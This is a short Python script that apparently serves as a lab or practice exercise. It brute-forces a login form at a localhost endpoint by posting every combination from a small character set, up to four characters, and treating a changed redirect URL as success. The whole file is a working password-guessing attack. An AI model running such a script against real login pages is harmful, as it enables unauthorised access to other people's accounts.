import requests

max_length = 4
target_item = 'asdf'
url = "http://localhost:8000/bruteforce"
default_answer = "http://localhost:8000/bruteforce"


# charset
char_list = [
    #'ä', 'ö', 'ü', 'Ä', 'Ö', 'Ü',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 
    #'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 
    's', 
    #'t', 'u', 'v', 'w', 'x', 'y', 'z',
    #'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    #'1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    ]

def generate_permutations(characters, n, prefix="", target=""):

    if len(prefix) == n:
        response = requests.post(url, data={"password": prefix}, allow_redirects=True).url
        if response != default_answer:
            print("Found password:", prefix)
            return True

        else:
            print(prefix)
            return False 

    for char in characters:
        new_prefix = prefix + char
        if generate_permutations(characters, n, new_prefix, target):
            return True

    return False

for length in range(1, max_length + 1):
    generate_permutations(char_list, length, target=target_item)